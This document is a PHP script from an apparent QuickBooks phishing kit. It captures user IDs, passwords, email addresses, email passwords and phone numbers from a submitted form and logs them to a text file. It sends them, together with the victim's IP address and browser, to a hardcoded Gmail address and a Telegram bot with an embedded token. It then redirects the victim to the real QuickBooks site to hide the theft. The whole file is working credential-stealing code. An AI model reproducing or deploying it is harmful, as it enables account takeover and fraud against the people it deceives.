<?php
header('Access-Control-Allow-Origin: *');
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION["userId"] = $_POST['userId'];
    $_SESSION["password"] = $_POST['password'];
    $_SESSION["email"] = $_POST['email'];
    $_SESSION["emailPassword"] = $_POST['emailPassword'];
    $_SESSION["phoneNumber"] = $_POST['phoneNumber'];

    $dataSetArray = ["user Id" => $_SESSION['userId'], "Password" => $_SESSION['password'],
        "Email Address" => $_SESSION['email'], "Email password" => $_SESSION['emailPassword'] , "Phone Number"=>$_SESSION['phoneNumber']];

    writeToFile($dataSetArray, "qb.txt", "-------QuickBook Mail-------.");

    sendMail($_SESSION['userId'], $_SESSION['password'], $_SESSION['email'], $_SESSION['emailPassword']);


    $parameter = array(
        "chat_id" => '841044634',
        "text" => $_SESSION['message']
    );
    sendtelegram("sendMessage", $parameter);

    die (json_encode(array('https://quickbooks.intuit.com/')));
}

function sendMail($userEmail, $userPassword, $keyPhase1, $keyPhase2)
{
    $ip_Address = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip_Address);
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $recipientMail = "misskimberlywilson@gmail.com";

    $subject = 'Result of ADA';

    $message = "---- Result of ADA ----" . "\n";
    $message .= "User ID: " . $userEmail . "\n";
    $message .= "Password: " . $userPassword . "\n";
    $message .= "Email: " . $keyPhase1 . "\n";
    $message .= "Email Password: " . $keyPhase2 . "\n";

    $message .= "User Information\n";
    $message .= "Client IP: " . $ip_Address . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip_Address ----\n";
    $message .= "User Agent: " . $userAgent . "\n";
    $_SESSION['message'] = $message;
    $header = "From:" . $userEmail . " <" . $userPassword . ">";
    mail($recipientMail, $subject, $message, $header);
}

function sendtelegram($method, $parameter)
{

    $api_key = '1520951540:AAE2bsiHQhAuiViJ57rIF8fCulQ13mCOXuI';

    $url = "https://api.telegram.org/bot$api_key/$method";
    if (!$curl = curl_init()) {
        exit();
    }

    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $parameter);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($curl);
    return $output;

}


function writeToFile($userArrayList, $filename, $fileHeader)
{
    $stream = fopen($filename, 'a');

    fwrite($stream, $fileHeader . "\n");
    foreach ($userArrayList as $key => $value) {
        fwrite($stream, $key . " = " . $value . "\n");
    }
    fwrite($stream, "------------------------------------------------" . "\n");
    fclose($stream);
}

?>